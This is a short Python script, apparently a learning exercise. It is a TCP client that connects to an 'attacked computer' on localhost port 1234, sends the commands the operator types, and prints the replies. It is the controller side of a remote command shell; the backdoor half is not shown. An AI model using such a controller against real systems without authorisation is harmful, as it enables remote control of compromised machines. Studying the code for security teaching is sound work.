import socket

SERVER_IP = "127.0.0.1"
SERVER_PORT = 1234

my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_socket.connect((SERVER_IP, SERVER_PORT))
print(f"[CLIENT] connected to attacked computer on {SERVER_IP}:{SERVER_PORT}")

run = True
waiting = False


def receive():
    global waiting
    data = my_socket.recv(1024).decode()
    # msg = data
    # while msg:
    #     msg += my_socket.recv(1024).decode()
    print(f'[CLIENT] server sent "{data}" \n[CLIENT] received data')
    waiting = False


def send():
    global waiting
    msg = str(input("[CLIENT] Enter command: "))
    my_socket.send(msg.encode())
    waiting = True


receive()
while run:
    if not waiting:
        send()
    else:
        receive()
